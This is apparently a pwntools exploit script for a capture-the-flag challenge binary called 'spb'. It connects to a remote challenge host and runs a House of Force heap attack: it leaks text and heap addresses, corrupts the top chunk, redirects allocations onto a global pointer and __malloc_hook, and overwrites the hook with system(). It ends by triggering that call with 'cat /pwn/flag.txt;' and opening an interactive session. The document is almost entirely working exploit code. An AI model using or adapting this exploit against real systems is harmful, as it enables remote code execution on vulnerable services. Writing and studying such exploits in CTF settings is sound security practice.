from pwn import process, remote, gdb, context, p64, u64, ELF, log
import struct

libc_bin = ELF("./libc.so.6")
chal = ELF("./spb")

if True:
    #r = process("./spb", env={"LD_PRELOAD" : "./libc.so.6"})
    r = remote("challenge.rgbsec.xyz", 6969)
    #gdb.attach(r.pid,"""break *main+33""")
else:
    r = gdb.debug("./spb", '''
# Break right after first call to malloc assigned to party
    break *(main+1f9)
    #break *(main+cd)
    break *(choose_song+62)
    break *(choose_song+a9)
    #disable 1
    disable 2
    disable 3
    break *(choose_song+67)
    break *(get_drink+11b)
    disable 4
    disable 5

commands 4
print/x $rax
continue
end

commands 1
print (void*)party
x/10gx (long*)party - 2
disable 1
#watch &__malloc_hook
break system
continue
end

# Run
continue
''', env={"LD_PRELOAD" : "./libc-2.27.so"})

def prime_heap():
    # Write 0xffffffffffffffff to heap top chunk
    r.recvuntil("How big is your party?")
    r.sendline("0")
    r.recvuntil("What's your name?")
    r.sendline("0")
    r.recvuntil("4. Leave\n> ")
    return

def get_song_pointer():
    r.sendline("3")
    d = r.recvline()
    addr = int(d.split()[2], 16)
    r.recvuntil("4. Leave\n> ")
    return addr

def get_text_base():
    return get_song_pointer() & ~4095

def get_heap_ptr():
    r.sendline("1")
    r.recvuntil("How long is the song name?\n> ")
    r.sendline("0")
    r.recvuntil("4. Leave\n> ")
    return get_song_pointer()

def get_libc(shellcode):
    r.sendline("1")
    r.recvuntil("How long is the song name?\n> ")
    r.sendline(str(0x10000000))
    r.recvuntil("What is the song title?\n> ")
    r.sendline(shellcode + "\x00")
    r.recvuntil("4. Leave\n> ")
    big_heap = get_song_pointer()
    lp = big_heap & ~4095
    lp += 0x10001000
    return lp, big_heap

def move_heap(cur_heap_top, target, b=True):
    alloc_needed = target - cur_heap_top - 0x20
    r.sendline("1")
    r.recvuntil("How long is the song name?\n> ")
    print("Moving heap")
    r.sendline(str(alloc_needed))
    rcv = r.recvuntil("4. Leave\n> ", timeout=3.0)
    if b"Leave" in rcv:
        return
    else:
        r.sendline()
        r.recvuntil("4. Leave\n> ", timeout=3.0)

def overwrite_party(newptr, newval):
    r.sendline("1")
    r.recvuntil("How long is the song name?\n> ")
    r.sendline("16")
    r.recvuntil("What is the song title?\n> ")
    poc = struct.pack("QQ", newptr, newval)
    r.sendline(poc)
    r.recvuntil("4. Leave\n> ")

def overwrite_hook(newval):
    r.sendline("1")
    r.recvuntil("How long is the song name?\n> ")
    r.sendline("8")
    r.recvuntil("What is the song title?\n> ")
    poc = struct.pack("Q", newval)
    r.sendline(poc)
    r.recvuntil("4. Leave\n> ")

def write(addr, val, base):
    pmember = (addr - 0x18 - base)
    assert pmember % 0x20 == 0
    pmember //= 0x20

    r.sendline("2")
    r.recvuntil("What party member is buying?\n> ")
    r.sendline("0")
    r.recvuntil("3. Leninade\n> ")
    r.sendline(str(val))
    r.recvuntil("4. Leave\n> ")

def heap_spray():
    r.recvuntil("How big is your party?")
    r.sendline("3")
    r.recvuntil("4. Leave\n> ")

    while True:
        input("?")
        r.sendline("1")
        r.recvuntil("How long is the song name?\n> ")
        r.sendline(str(0x10000000))
        r.recvuntil("What is the song title?\n> ")
        r.sendline("")
        r.recvuntil("4. Leave\n> ")
        break

    r.interactive()
    import sys
    sys.exit()

def run_shellcode(loc):
    print("Running shellcode")
    r.sendline("1")
    r.recvuntil("How long is the song name?\n> ")
    r.sendline(str(loc))
    return
    r.recvuntil("What is the song title?\n> ")

#heap_spray()

prime_heap()
txt = get_text_base()
heap = get_heap_ptr()

cur_heap_top = heap + 0x10
print(f"heap pointer is at {cur_heap_top:x}")
target = txt + 0x202050 # pointer to party, party_size
print(f"target is {target:x}")
move_heap(cur_heap_top, target)

libc, big_heap = get_libc("cat /pwn/flag.txt;")
print(f"libc is at {libc:x}")

malloc_hook = libc + 0x3ebc30
system = libc + 0x4f4e0
#system = libc + 0xe4f62

cur_heap_top = target + 0x10
print(f"{cur_heap_top:x} cur_heap_top")

base = cur_heap_top + 0x08 - 0x18
overwrite_party(base, 0xffffffffffffffff)
write(cur_heap_top + 0x08, -1, base)

move_heap(cur_heap_top, malloc_hook, b=False)
print("Overwriting hook")
overwrite_hook(system)

run_shellcode(big_heap)

r.interactive()
